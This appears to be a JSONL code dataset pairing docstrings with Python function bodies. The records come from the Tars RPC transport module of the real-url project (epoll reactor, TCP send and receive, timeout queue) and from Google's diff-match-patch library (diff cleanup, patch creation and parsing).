{"docstring": "'''\n@brief: \u66f4\u65b0adapter\u5bf9\u5e94\u7684fd\u7684epoll\u72b6\u6001\n@return: None\n@rtype: None\n@note: FDReactor\u4f7f\u7528\u7684epoll\u662fEPOLLET\u6a21\u5f0f\uff0c\u540c\u4e00\u4e8b\u4ef6\u53ea\u901a\u77e5\u4e00\u6b21\n       \u5e0c\u671b\u67d0\u4e00\u4e8b\u4ef6\u518d\u6b21\u901a\u77e5\u9700\u8c03\u7528\u6b64\u51fd\u6570\n'''\n", "func_signal": "def notify(self, adapter):\n", "code": "tarsLogger.debug('FDReactor:notify')\nfd = adapter.trans().getFd()\nif fd != -1:\n    self.__ep.modify(fd,\n                     select.EPOLLET | select.EPOLLOUT | select.EPOLLIN)", "path": "real-url/danmu/danmaku/tars/__trans.py", "commit_date": "2020-06-18 00:00:00", "repo_name": "wbt5/real-url", "stars": 6934, "license": "gpl-2.0", "language": "python", "size": 406}
{"docstring": "'''\n@brief: \u5904\u7406\u53d1\u9001\u4e8b\u4ef6\n@param adapter: \u4e8b\u4ef6\u5bf9\u5e94\u7684adapter\n@type adapter: AdapterProxy\n@return: None\n@rtype: None\n'''\n", "func_signal": "def handleOutput(self, adapter):\n", "code": "tarsLogger.debug('FDReactor:handleOutput')\nif not adapter.trans().isValid():\n    return\nwhile adapter.trans().doRequest() >= 0 and adapter.sendRequest():\n    pass", "path": "real-url/danmu/danmaku/tars/__trans.py", "commit_date": "2020-06-18 00:00:00", "repo_name": "wbt5/real-url", "stars": 6934, "license": "gpl-2.0", "language": "python", "size": 406}
{"docstring": "# threading.Thread.__init__(self)\n", "func_signal": "def __init__(self, timeout=0.1):\n", "code": "tarsLogger.debug('QueueTimeout:__init__')\nsuper(QueueTimeout, self).__init__()\nself.timeout = timeout\nself.__terminate = False\nself.__handler = None\nself.__lock = threading.Condition()", "path": "real-url/danmu/danmaku/tars/__TimeoutQueue.py", "commit_date": "2020-06-18 00:00:00", "repo_name": "wbt5/real-url", "stars": 6934, "license": "gpl-2.0", "language": "python", "size": 406}
{"docstring": "'''\n@brief: \u5b9e\u73b0tcp\u7684recv\n@param bufsize: \u63a5\u6536\u5927\u5c0f\n@type bufsize: int\n@param flag: \u63a5\u6536\u6807\u5fd7\n@param flag: int\n@return: \u63a5\u6536\u7684\u5185\u5bb9\uff0c\u63a5\u6536\u51fa\u9519\u8fd4\u56deNone\n@rtype: str\n'''\n", "func_signal": "def recv(self, bufsize, flag=0):\n", "code": "tarsLogger.debug('TcpTransceiver:recv')\nassert(self.isValid())\n\nbuf = ''\ntry:\n    buf = self.getSock().recv(bufsize, flag)\n    if len(buf) == 0:\n        tarsLogger.info('tcp recv, fd: %d, %s, recv 0 bytes, close',\n                        self.getFd(), self.getEndPointInfo())\n        self.close()\n        return None\nexcept socket.error as msg:\n    if msg.errno != errno.EAGAIN:\n        tarsLogger.info('tcp recv, fd: %d, %s, faild!, %s, close',\n                        self.getFd(), self.getEndPointInfo(), msg)\n        self.close()\n        return None\n\ntarsLogger.info('tcp recv, fd: %d, %s, nbytes: %d',\n                self.getFd(), self.getEndPointInfo(), len(buf))\nreturn buf", "path": "real-url/danmu/danmaku/tars/__trans.py", "commit_date": "2020-06-18 00:00:00", "repo_name": "wbt5/real-url", "stars": 6934, "license": "gpl-2.0", "language": "python", "size": 406}
{"docstring": "'''\n@brief: \u7ed3\u675fFDReactor\u7684\u7ebf\u7a0b\n@return: None\n@rtype: None\n'''\n", "func_signal": "def terminate(self):\n", "code": "tarsLogger.debug('FDReactor:terminate')\nself.__terminate = True\nself.__ep.modify(self.__shutdown.fileno(), select.EPOLLOUT)\nself.__adapterTab = {}", "path": "real-url/danmu/danmaku/tars/__trans.py", "commit_date": "2020-06-18 00:00:00", "repo_name": "wbt5/real-url", "stars": 6934, "license": "gpl-2.0", "language": "python", "size": 406}
{"docstring": "'''\n@brief: \u6839\u636euniqId\u83b7\u53d6item\uff0c\u4e0d\u4f1a\u5220\u9664item\n@param uniqId: item\u7684id\n@type uniqId: int\n@return: item\n@rtype: any type\n'''\n# self.__lock.acquire()\n", "func_signal": "def peek(self, uniqId):\n", "code": "lock = LockGuard(self.__lock)\n\nret = self.__data.get(uniqId, None)\n# self.__lock.release()\nif not ret:\n    return None\nreturn ret[0]", "path": "real-url/danmu/danmaku/tars/__TimeoutQueue.py", "commit_date": "2020-06-18 00:00:00", "repo_name": "wbt5/real-url", "stars": 6934, "license": "gpl-2.0", "language": "python", "size": 406}
{"docstring": "'''\n@brief: \u521d\u59cb\u5316socket\uff0c\u5e76\u8fde\u63a5\u670d\u52a1\u5668\n@return: \u6210\u529f\u8fd4\u56de0\uff0c\u5931\u8d25\u8fd4\u56de-1\n@rtype: int\n'''\n", "func_signal": "def reInit(self):\n", "code": "tarsLogger.debug('Transceiver:reInit')\nassert(self.isValid() is False)\nif self.__epi.getConnType() != EndPointInfo.SOCK_TCP:\n    return -1\ntry:\n    self.__sock = socket.socket()\n    self.__sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    self.__sock.setblocking(0)\n    self.__sock.connect((self.__epi.getIp(), self.__epi.getPort()))\n    self.__connStatus = Transceiver.CONNECTED\nexcept socket.error as msg:\n    if msg.errno == errno.EINPROGRESS:\n        self.__connStatus = Transceiver.CONNECTING\n    else:\n        tarsLogger.info('reInit, %s, faild!, %s',\n                        self.__epi, msg)\n        self.__sock = None\n        return -1\ntarsLogger.info('reInit, connect: %s, fd: %d',\n                self.__epi, self.getFd())\nreturn 0", "path": "real-url/danmu/danmaku/tars/__trans.py", "commit_date": "2020-06-18 00:00:00", "repo_name": "wbt5/real-url", "stars": 6934, "license": "gpl-2.0", "language": "python", "size": 406}
{"docstring": "'''\n@brief: \u6570\u636e\u5165\u961f\u5217\uff0c\u5982\u679c\u961f\u5217\u5df2\u7ecf\u6709\u4e86uniqId\uff0c\u63d2\u5165\u5931\u8d25\n@param item: \u63d2\u5165\u7684\u6570\u636e\n@type item: any type\n@return: \u63d2\u5165\u662f\u5426\u6210\u529f\n@rtype: bool\n'''\n", "func_signal": "def push(self, item, uniqId):\n", "code": "begtime = time.time()\nret = True\n# self.__lock.acquire()\nlock = LockGuard(self.__lock)\n\nif uniqId in self.__data:\n    ret = False\nelse:\n    self.__data[uniqId] = [item, begtime]\n    self.__queue.append(uniqId)\n# self.__lock.release()\nreturn ret", "path": "real-url/danmu/danmaku/tars/__TimeoutQueue.py", "commit_date": "2020-06-18 00:00:00", "repo_name": "wbt5/real-url", "stars": 6934, "license": "gpl-2.0", "language": "python", "size": 406}
{"docstring": "'''\n@brief: \u5904\u7406\u63a5\u6536\u4e8b\u4ef6\n@param adapter: \u4e8b\u4ef6\u5bf9\u5e94\u7684adapter\n@type adapter: AdapterProxy\n@return: None\n@rtype: None\n'''\n\n", "func_signal": "def handleInput(self, adapter):\n", "code": "tarsLogger.debug('FDReactor:handleInput')\nif not adapter.trans().isValid():\n    return\n\nrsplist = adapter.trans().doResponse()\nif not rsplist:\n    return\nfor rsp in rsplist:\n    adapter.finished(rsp)", "path": "real-url/danmu/danmaku/tars/__trans.py", "commit_date": "2020-06-18 00:00:00", "repo_name": "wbt5/real-url", "stars": 6934, "license": "gpl-2.0", "language": "python", "size": 406}
{"docstring": "'''\n@brief: \u83b7\u53d6socket\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\n@return: \u5982\u679cself.__sock\u6ca1\u6709\u5efa\u7acb\u8fd4\u56de-1\n@rtype: int\n'''\n", "func_signal": "def getFd(self):\n", "code": "if self.__sock:\n    return self.__sock.fileno()\nelse:\n    return -1", "path": "real-url/danmu/danmaku/tars/__trans.py", "commit_date": "2020-06-18 00:00:00", "repo_name": "wbt5/real-url", "stars": 6934, "license": "gpl-2.0", "language": "python", "size": 406}
{"docstring": "'''\n@brief: \u6ce8\u518cadapter\n@param adapter: \u6536\u53d1\u4e8b\u4ef6\u5904\u7406\u7c7b\n@type adapter: AdapterProxy\n@param events: \u6ce8\u518c\u4e8b\u4ef6\n@type events: int\n@return: None\n@rtype: None\n'''\n", "func_signal": "def registerAdapter(self, adapter, events):\n", "code": "tarsLogger.debug('FDReactor:registerAdapter events : %d', events)\nevents |= select.EPOLLET\ntry:\n    self.__ep.unregister(adapter.trans().getFd())\nexcept:\n    pass\nself.__ep.register(adapter.trans().getFd(), events)\nself.__adapterTab[adapter.trans().getFd()] = adapter", "path": "real-url/danmu/danmaku/tars/__trans.py", "commit_date": "2020-06-18 00:00:00", "repo_name": "wbt5/real-url", "stars": 6934, "license": "gpl-2.0", "language": "python", "size": 406}
{"docstring": "'''\n@brief: \u89e3\u7801\u54cd\u5e94\u62a5\u6587\n@param buf: \u591a\u4e2a\u5e8f\u5217\u5316\u540e\u7684\u54cd\u5e94\u62a5\u6587\u6570\u636e\n@type buf: str\n@return: \u89e3\u7801\u51fa\u6765\u7684\u54cd\u5e94\u62a5\u6587\u548c\u89e3\u7801\u7684buffer\u957f\u5ea6\n@rtype: rsplist: \u88c5\u6709ResponsePacket\u7684list\n        unpacklen: int\n'''\n", "func_signal": "def unpackRspList(buf):\n", "code": "rsplist = []\nif not buf:\n    return rsplist\n\nunpacklen = 0\nbuf = buffer(buf)\nwhile True:\n    if len(buf) - unpacklen < 4:\n        break\n    packsize = buf[unpacklen: unpacklen+4]\n    packsize, = struct.unpack_from('!i', packsize)\n    if len(buf) < unpacklen + packsize:\n        break\n\n    ios = TarsInputStream(buf[unpacklen+4: unpacklen+packsize])\n    rsp = ResponsePacket.readFrom(ios)\n    rsplist.append(rsp)\n    unpacklen += packsize\n\nreturn rsplist, unpacklen", "path": "real-url/danmu/danmaku/tars/__TimeoutQueue.py", "commit_date": "2020-06-18 00:00:00", "repo_name": "wbt5/real-url", "stars": 6934, "license": "gpl-2.0", "language": "python", "size": 406}
{"docstring": "'''\n@brief: \u8bbe\u7f6e\u4e3a\u8fde\u63a5\u5931\u8d25\n@return: None\n@rtype: None\n'''\n", "func_signal": "def setConnFailed(self):\n", "code": "self.__connFailed = True\nself.__connStatus = Transceiver.UNCONNECTED", "path": "real-url/danmu/danmaku/tars/__trans.py", "commit_date": "2020-06-18 00:00:00", "repo_name": "wbt5/real-url", "stars": 6934, "license": "gpl-2.0", "language": "python", "size": 406}
{"docstring": "'''\n@brief: \u5b9e\u73b0tcp\u7684\u53d1\u9001\n@param buf: \u53d1\u9001\u7684\u6570\u636e\n@type buf: str\n@param flag: \u53d1\u9001\u6807\u5fd7\n@param flag: int\n@return: \u53d1\u9001\u5b57\u8282\u6570\n@rtype: int\n'''\n", "func_signal": "def send(self, buf, flag=0):\n", "code": "tarsLogger.debug('TcpTransceiver:send')\nif not self.isValid():\n    return -1\n\nnbytes = 0\ntry:\n    nbytes = self.getSock().send(buf, flag)\n    tarsLogger.info('tcp send, fd: %d, %s, len: %d',\n                    self.getFd(), self.getEndPointInfo(), nbytes)\nexcept socket.error as msg:\n    if msg.errno != errno.EAGAIN:\n        tarsLogger.error('tcp send, fd: %d, %s, fail!, %s, close',\n                         self.getFd(), self.getEndPointInfo(), msg)\n        self.close()\n        return 0\nreturn nbytes", "path": "real-url/danmu/danmaku/tars/__trans.py", "commit_date": "2020-06-18 00:00:00", "repo_name": "wbt5/real-url", "stars": 6934, "license": "gpl-2.0", "language": "python", "size": 406}
{"docstring": "'''\n@brief: \u83b7\u53d6\u961f\u5217\u957f\u5ea6\n@return: \u961f\u5217\u957f\u5ea6\n@rtype: int\n'''\n# self.__lock.acquire()\n", "func_signal": "def size(self):\n", "code": "lock = LockGuard(self.__lock)\nret = len(self.__data)\n# self.__lock.release()\nreturn ret", "path": "real-url/danmu/danmaku/tars/__TimeoutQueue.py", "commit_date": "2020-06-18 00:00:00", "repo_name": "wbt5/real-url", "stars": 6934, "license": "gpl-2.0", "language": "python", "size": 406}
{"docstring": "'''\n@brief: \u521d\u59cb\u5316\uff0c\u4f7f\u7528FDReactor\u524d\u5fc5\u987b\u8c03\u7528\n@return: None\n@rtype: None\n'''\n", "func_signal": "def initialize(self):\n", "code": "tarsLogger.debug('FDReactor:initialize')\nself.__ep = select.epoll()\nself.__shutdown = socket.socket()\nself.__ep.register(self.__shutdown.fileno(),\n                   select.EPOLLET | select.EPOLLIN)\ntarsLogger.debug('FDReactor init, shutdown fd : %d',\n                 self.__shutdown.fileno())", "path": "real-url/danmu/danmaku/tars/__trans.py", "commit_date": "2020-06-18 00:00:00", "repo_name": "wbt5/real-url", "stars": 6934, "license": "gpl-2.0", "language": "python", "size": 406}
{"docstring": "\"\"\"Add some padding on text start and end so that edges can match\nsomething.  Intended to be called only from within patch_apply.\n\nArgs:\n  patches: Array of Patch objects.\n\nReturns:\n  The padding string added to each side.\n\"\"\"\n", "func_signal": "def patch_addPadding(self, patches):\n", "code": "paddingLength = self.Patch_Margin\nnullPadding = \"\"\nfor x in range(1, paddingLength + 1):\n  nullPadding += chr(x)\n\n# Bump all the patches forward.\nfor patch in patches:\n  patch.start1 += paddingLength\n  patch.start2 += paddingLength\n\n# Add some padding on start of first diff.\npatch = patches[0]\ndiffs = patch.diffs\nif not diffs or diffs[0][0] != self.DIFF_EQUAL:\n  # Add nullPadding equality.\n  diffs.insert(0, (self.DIFF_EQUAL, nullPadding))\n  patch.start1 -= paddingLength  # Should be 0.\n  patch.start2 -= paddingLength  # Should be 0.\n  patch.length1 += paddingLength\n  patch.length2 += paddingLength\nelif paddingLength > len(diffs[0][1]):\n  # Grow first equality.\n  extraLength = paddingLength - len(diffs[0][1])\n  newText = nullPadding[len(diffs[0][1]):] + diffs[0][1]\n  diffs[0] = (diffs[0][0], newText)\n  patch.start1 -= extraLength\n  patch.start2 -= extraLength\n  patch.length1 += extraLength\n  patch.length2 += extraLength\n\n# Add some padding on end of last diff.\npatch = patches[-1]\ndiffs = patch.diffs\nif not diffs or diffs[-1][0] != self.DIFF_EQUAL:\n  # Add nullPadding equality.\n  diffs.append((self.DIFF_EQUAL, nullPadding))\n  patch.length1 += paddingLength\n  patch.length2 += paddingLength\nelif paddingLength > len(diffs[-1][1]):\n  # Grow last equality.\n  extraLength = paddingLength - len(diffs[-1][1])\n  newText = diffs[-1][1] + nullPadding[:extraLength]\n  diffs[-1] = (diffs[-1][0], newText)\n  patch.length1 += extraLength\n  patch.length2 += extraLength\n\nreturn nullPadding", "path": "diff-match-patch/python3/diff_match_patch.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "google/diff-match-patch", "stars": 6987, "license": "apache-2.0", "language": "python", "size": 675}
{"docstring": "\"\"\"Look for single edits surrounded on both sides by equalities\nwhich can be shifted sideways to align the edit to a word boundary.\ne.g: The c<ins>at c</ins>ame. -> The <ins>cat </ins>came.\n\nArgs:\n  diffs: Array of diff tuples.\n\"\"\"\n\n", "func_signal": "def diff_cleanupSemanticLossless(self, diffs):\n", "code": "def diff_cleanupSemanticScore(one, two):\n  \"\"\"Given two strings, compute a score representing whether the\n  internal boundary falls on logical boundaries.\n  Scores range from 6 (best) to 0 (worst).\n  Closure, but does not reference any external variables.\n\n  Args:\n    one: First string.\n    two: Second string.\n\n  Returns:\n    The score.\n  \"\"\"\n  if not one or not two:\n    # Edges are the best.\n    return 6\n\n  # Each port of this function behaves slightly differently due to\n  # subtle differences in each language's definition of things like\n  # 'whitespace'.  Since this function's purpose is largely cosmetic,\n  # the choice has been made to use each language's native features\n  # rather than force total conformity.\n  char1 = one[-1]\n  char2 = two[0]\n  nonAlphaNumeric1 = not char1.isalnum()\n  nonAlphaNumeric2 = not char2.isalnum()\n  whitespace1 = nonAlphaNumeric1 and char1.isspace()\n  whitespace2 = nonAlphaNumeric2 and char2.isspace()\n  lineBreak1 = whitespace1 and (char1 == \"\\r\" or char1 == \"\\n\")\n  lineBreak2 = whitespace2 and (char2 == \"\\r\" or char2 == \"\\n\")\n  blankLine1 = lineBreak1 and self.BLANKLINEEND.search(one)\n  blankLine2 = lineBreak2 and self.BLANKLINESTART.match(two)\n\n  if blankLine1 or blankLine2:\n    # Five points for blank lines.\n    return 5\n  elif lineBreak1 or lineBreak2:\n    # Four points for line breaks.\n    return 4\n  elif nonAlphaNumeric1 and not whitespace1 and whitespace2:\n    # Three points for end of sentences.\n    return 3\n  elif whitespace1 or whitespace2:\n    # Two points for whitespace.\n    return 2\n  elif nonAlphaNumeric1 or nonAlphaNumeric2:\n    # One point for non-alphanumeric.\n    return 1\n  return 0\n\npointer = 1\n# Intentionally ignore the first and last element (don't need checking).\nwhile pointer < len(diffs) - 1:\n  if (diffs[pointer - 1][0] == self.DIFF_EQUAL and\n      diffs[pointer + 1][0] == self.DIFF_EQUAL):\n    # This is a single edit surrounded by equalities.\n    equality1 = diffs[pointer - 1][1]\n    edit = diffs[pointer][1]\n    equality2 = diffs[pointer + 1][1]\n\n    # First, shift the edit as far left as possible.\n    commonOffset = self.diff_commonSuffix(equality1, edit)\n    if commonOffset:\n      commonString = edit[-commonOffset:]\n      equality1 = equality1[:-commonOffset]\n      edit = commonString + edit[:-commonOffset]\n      equality2 = commonString + equality2\n\n    # Second, step character by character right, looking for the best fit.\n    bestEquality1 = equality1\n    bestEdit = edit\n    bestEquality2 = equality2\n    bestScore = (diff_cleanupSemanticScore(equality1, edit) +\n        diff_cleanupSemanticScore(edit, equality2))\n    while edit and equality2 and edit[0] == equality2[0]:\n      equality1 += edit[0]\n      edit = edit[1:] + equality2[0]\n      equality2 = equality2[1:]\n      score = (diff_cleanupSemanticScore(equality1, edit) +\n          diff_cleanupSemanticScore(edit, equality2))\n      # The >= encourages trailing rather than leading whitespace on edits.\n      if score >= bestScore:\n        bestScore = score\n        bestEquality1 = equality1\n        bestEdit = edit\n        bestEquality2 = equality2\n\n    if diffs[pointer - 1][1] != bestEquality1:\n      # We have an improvement, save it back to the diff.\n      if bestEquality1:\n        diffs[pointer - 1] = (diffs[pointer - 1][0], bestEquality1)\n      else:\n        del diffs[pointer - 1]\n        pointer -= 1\n      diffs[pointer] = (diffs[pointer][0], bestEdit)\n      if bestEquality2:\n        diffs[pointer + 1] = (diffs[pointer + 1][0], bestEquality2)\n      else:\n        del diffs[pointer + 1]\n        pointer -= 1\n  pointer += 1", "path": "diff-match-patch/python3/diff_match_patch.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "google/diff-match-patch", "stars": 6987, "license": "apache-2.0", "language": "python", "size": 675}
{"docstring": "\"\"\"Parse a textual representation of patches and return a list of patch\nobjects.\n\nArgs:\n  textline: Text representation of patches.\n\nReturns:\n  Array of Patch objects.\n\nRaises:\n  ValueError: If invalid input.\n\"\"\"\n", "func_signal": "def patch_fromText(self, textline):\n", "code": "patches = []\nif not textline:\n  return patches\ntext = textline.split('\\n')\nwhile len(text) != 0:\n  m = re.match(r\"^@@ -(\\d+),?(\\d*) \\+(\\d+),?(\\d*) @@$\", text[0])\n  if not m:\n    raise ValueError(\"Invalid patch string: \" + text[0])\n  patch = patch_obj()\n  patches.append(patch)\n  patch.start1 = int(m.group(1))\n  if m.group(2) == '':\n    patch.start1 -= 1\n    patch.length1 = 1\n  elif m.group(2) == '0':\n    patch.length1 = 0\n  else:\n    patch.start1 -= 1\n    patch.length1 = int(m.group(2))\n\n  patch.start2 = int(m.group(3))\n  if m.group(4) == '':\n    patch.start2 -= 1\n    patch.length2 = 1\n  elif m.group(4) == '0':\n    patch.length2 = 0\n  else:\n    patch.start2 -= 1\n    patch.length2 = int(m.group(4))\n\n  del text[0]\n\n  while len(text) != 0:\n    if text[0]:\n      sign = text[0][0]\n    else:\n      sign = ''\n    line = urllib.parse.unquote(text[0][1:])\n    if sign == '+':\n      # Insertion.\n      patch.diffs.append((self.DIFF_INSERT, line))\n    elif sign == '-':\n      # Deletion.\n      patch.diffs.append((self.DIFF_DELETE, line))\n    elif sign == ' ':\n      # Minor equality.\n      patch.diffs.append((self.DIFF_EQUAL, line))\n    elif sign == '@':\n      # Start of next patch.\n      break\n    elif sign == '':\n      # Blank line?  Whatever.\n      pass\n    else:\n      # WTF?\n      raise ValueError(\"Invalid patch mode: '%s'\\n%s\" % (sign, line))\n    del text[0]\nreturn patches", "path": "diff-match-patch/python3/diff_match_patch.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "google/diff-match-patch", "stars": 6987, "license": "apache-2.0", "language": "python", "size": 675}
{"docstring": "\"\"\"Compute and return the destination text (all equalities and insertions).\n\nArgs:\n  diffs: Array of diff tuples.\n\nReturns:\n  Destination text.\n\"\"\"\n", "func_signal": "def diff_text2(self, diffs):\n", "code": "text = []\nfor (op, data) in diffs:\n  if op != self.DIFF_DELETE:\n    text.append(data)\nreturn \"\".join(text)", "path": "diff-match-patch/python3/diff_match_patch.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "google/diff-match-patch", "stars": 6987, "license": "apache-2.0", "language": "python", "size": 675}
{"docstring": "\"\"\"Reduce the number of edits by eliminating operationally trivial\nequalities.\n\nArgs:\n  diffs: Array of diff tuples.\n\"\"\"\n", "func_signal": "def diff_cleanupEfficiency(self, diffs):\n", "code": "changes = False\nequalities = []  # Stack of indices where equalities are found.\nlastEquality = None  # Always equal to diffs[equalities[-1]][1]\npointer = 0  # Index of current position.\npre_ins = False  # Is there an insertion operation before the last equality.\npre_del = False  # Is there a deletion operation before the last equality.\npost_ins = False  # Is there an insertion operation after the last equality.\npost_del = False  # Is there a deletion operation after the last equality.\nwhile pointer < len(diffs):\n  if diffs[pointer][0] == self.DIFF_EQUAL:  # Equality found.\n    if (len(diffs[pointer][1]) < self.Diff_EditCost and\n        (post_ins or post_del)):\n      # Candidate found.\n      equalities.append(pointer)\n      pre_ins = post_ins\n      pre_del = post_del\n      lastEquality = diffs[pointer][1]\n    else:\n      # Not a candidate, and can never become one.\n      equalities = []\n      lastEquality = None\n\n    post_ins = post_del = False\n  else:  # An insertion or deletion.\n    if diffs[pointer][0] == self.DIFF_DELETE:\n      post_del = True\n    else:\n      post_ins = True\n\n    # Five types to be split:\n    # <ins>A</ins><del>B</del>XY<ins>C</ins><del>D</del>\n    # <ins>A</ins>X<ins>C</ins><del>D</del>\n    # <ins>A</ins><del>B</del>X<ins>C</ins>\n    # <ins>A</del>X<ins>C</ins><del>D</del>\n    # <ins>A</ins><del>B</del>X<del>C</del>\n\n    if lastEquality and ((pre_ins and pre_del and post_ins and post_del) or\n                         ((len(lastEquality) < self.Diff_EditCost / 2) and\n                          (pre_ins + pre_del + post_ins + post_del) == 3)):\n      # Duplicate record.\n      diffs.insert(equalities[-1], (self.DIFF_DELETE, lastEquality))\n      # Change second copy to insert.\n      diffs[equalities[-1] + 1] = (self.DIFF_INSERT,\n          diffs[equalities[-1] + 1][1])\n      equalities.pop()  # Throw away the equality we just deleted.\n      lastEquality = None\n      if pre_ins and pre_del:\n        # No changes made which could affect previous entry, keep going.\n        post_ins = post_del = True\n        equalities = []\n      else:\n        if len(equalities):\n          equalities.pop()  # Throw away the previous equality.\n        if len(equalities):\n          pointer = equalities[-1]\n        else:\n          pointer = -1\n        post_ins = post_del = False\n      changes = True\n  pointer += 1\n\nif changes:\n  self.diff_cleanupMerge(diffs)", "path": "diff-match-patch/python3/diff_match_patch.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "google/diff-match-patch", "stars": 6987, "license": "apache-2.0", "language": "python", "size": 675}
{"docstring": "\"\"\"Rehydrate the text in a diff from a string of line hashes to real lines\nof text.\n\nArgs:\n  diffs: Array of diff tuples.\n  lineArray: Array of unique strings.\n\"\"\"\n", "func_signal": "def diff_charsToLines(self, diffs, lineArray):\n", "code": "for i in range(len(diffs)):\n  text = []\n  for char in diffs[i][1]:\n    text.append(lineArray[ord(char)])\n  diffs[i] = (diffs[i][0], \"\".join(text))", "path": "diff-match-patch/python3/diff_match_patch.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "google/diff-match-patch", "stars": 6987, "license": "apache-2.0", "language": "python", "size": 675}
{"docstring": "\"\"\"Compute a list of patches to turn text1 into text2.\nUse diffs if provided, otherwise compute it ourselves.\nThere are four ways to call this function, depending on what data is\navailable to the caller:\nMethod 1:\na = text1, b = text2\nMethod 2:\na = diffs\nMethod 3 (optimal):\na = text1, b = diffs\nMethod 4 (deprecated, use method 3):\na = text1, b = text2, c = diffs\n\nArgs:\n  a: text1 (methods 1,3,4) or Array of diff tuples for text1 to\n      text2 (method 2).\n  b: text2 (methods 1,4) or Array of diff tuples for text1 to\n      text2 (method 3) or undefined (method 2).\n  c: Array of diff tuples for text1 to text2 (method 4) or\n      undefined (methods 1,2,3).\n\nReturns:\n  Array of Patch objects.\n\"\"\"\n", "func_signal": "def patch_make(self, a, b=None, c=None):\n", "code": "text1 = None\ndiffs = None\nif isinstance(a, str) and isinstance(b, str) and c is None:\n  # Method 1: text1, text2\n  # Compute diffs from text1 and text2.\n  text1 = a\n  diffs = self.diff_main(text1, b, True)\n  if len(diffs) > 2:\n    self.diff_cleanupSemantic(diffs)\n    self.diff_cleanupEfficiency(diffs)\nelif isinstance(a, list) and b is None and c is None:\n  # Method 2: diffs\n  # Compute text1 from diffs.\n  diffs = a\n  text1 = self.diff_text1(diffs)\nelif isinstance(a, str) and isinstance(b, list) and c is None:\n  # Method 3: text1, diffs\n  text1 = a\n  diffs = b\nelif (isinstance(a, str) and isinstance(b, str) and\n      isinstance(c, list)):\n  # Method 4: text1, text2, diffs\n  # text2 is not used.\n  text1 = a\n  diffs = c\nelse:\n  raise ValueError(\"Unknown call format to patch_make.\")\n\nif not diffs:\n  return []  # Get rid of the None case.\npatches = []\npatch = patch_obj()\nchar_count1 = 0  # Number of characters into the text1 string.\nchar_count2 = 0  # Number of characters into the text2 string.\nprepatch_text = text1  # Recreate the patches to determine context info.\npostpatch_text = text1\nfor x in range(len(diffs)):\n  (diff_type, diff_text) = diffs[x]\n  if len(patch.diffs) == 0 and diff_type != self.DIFF_EQUAL:\n    # A new patch starts here.\n    patch.start1 = char_count1\n    patch.start2 = char_count2\n  if diff_type == self.DIFF_INSERT:\n    # Insertion\n    patch.diffs.append(diffs[x])\n    patch.length2 += len(diff_text)\n    postpatch_text = (postpatch_text[:char_count2] + diff_text +\n                      postpatch_text[char_count2:])\n  elif diff_type == self.DIFF_DELETE:\n    # Deletion.\n    patch.length1 += len(diff_text)\n    patch.diffs.append(diffs[x])\n    postpatch_text = (postpatch_text[:char_count2] +\n                      postpatch_text[char_count2 + len(diff_text):])\n  elif (diff_type == self.DIFF_EQUAL and\n        len(diff_text) <= 2 * self.Patch_Margin and\n        len(patch.diffs) != 0 and len(diffs) != x + 1):\n    # Small equality inside a patch.\n    patch.diffs.append(diffs[x])\n    patch.length1 += len(diff_text)\n    patch.length2 += len(diff_text)\n\n  if (diff_type == self.DIFF_EQUAL and\n      len(diff_text) >= 2 * self.Patch_Margin):\n    # Time for a new patch.\n    if len(patch.diffs) != 0:\n      self.patch_addContext(patch, prepatch_text)\n      patches.append(patch)\n      patch = patch_obj()\n      # Unlike Unidiff, our patch lists have a rolling context.\n      # https://github.com/google/diff-match-patch/wiki/Unidiff\n      # Update prepatch text & pos to reflect the application of the\n      # just completed patch.\n      prepatch_text = postpatch_text\n      char_count1 = char_count2\n\n  # Update the current character count.\n  if diff_type != self.DIFF_INSERT:\n    char_count1 += len(diff_text)\n  if diff_type != self.DIFF_DELETE:\n    char_count2 += len(diff_text)\n\n# Pick up the leftover patch if not empty.\nif len(patch.diffs) != 0:\n  self.patch_addContext(patch, prepatch_text)\n  patches.append(patch)\nreturn patches", "path": "diff-match-patch/python3/diff_match_patch.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "google/diff-match-patch", "stars": 6987, "license": "apache-2.0", "language": "python", "size": 675}
{"docstring": "\"\"\"Initialise the alphabet for the Bitap algorithm.\n\nArgs:\n  pattern: The text to encode.\n\nReturns:\n  Hash of character locations.\n\"\"\"\n", "func_signal": "def match_alphabet(self, pattern):\n", "code": "s = {}\nfor char in pattern:\n  s[char] = 0\nfor i in range(len(pattern)):\n  s[pattern[i]] |= 1 << (len(pattern) - i - 1)\nreturn s", "path": "diff-match-patch/python3/diff_match_patch.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "google/diff-match-patch", "stars": 6987, "license": "apache-2.0", "language": "python", "size": 675}
{"docstring": "\"\"\"Determine if the suffix of one string is the prefix of another.\n\nArgs:\n  text1 First string.\n  text2 Second string.\n\nReturns:\n  The number of characters common to the end of the first\n  string and the start of the second string.\n\"\"\"\n# Cache the text lengths to prevent multiple calls.\n", "func_signal": "def diff_commonOverlap(self, text1, text2):\n", "code": "text1_length = len(text1)\ntext2_length = len(text2)\n# Eliminate the null case.\nif text1_length == 0 or text2_length == 0:\n  return 0\n# Truncate the longer string.\nif text1_length > text2_length:\n  text1 = text1[-text2_length:]\nelif text1_length < text2_length:\n  text2 = text2[:text1_length]\ntext_length = min(text1_length, text2_length)\n# Quick check for the worst case.\nif text1 == text2:\n  return text_length\n\n# Start by looking for a single character match\n# and increase length until no match is found.\n# Performance analysis: https://neil.fraser.name/news/2010/11/04/\nbest = 0\nlength = 1\nwhile True:\n  pattern = text1[-length:]\n  found = text2.find(pattern)\n  if found == -1:\n    return best\n  length += found\n  if found == 0 or text1[-length:] == text2[:length]:\n    best = length\n    length += 1", "path": "diff-match-patch/python3/diff_match_patch.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "google/diff-match-patch", "stars": 6987, "license": "apache-2.0", "language": "python", "size": 675}
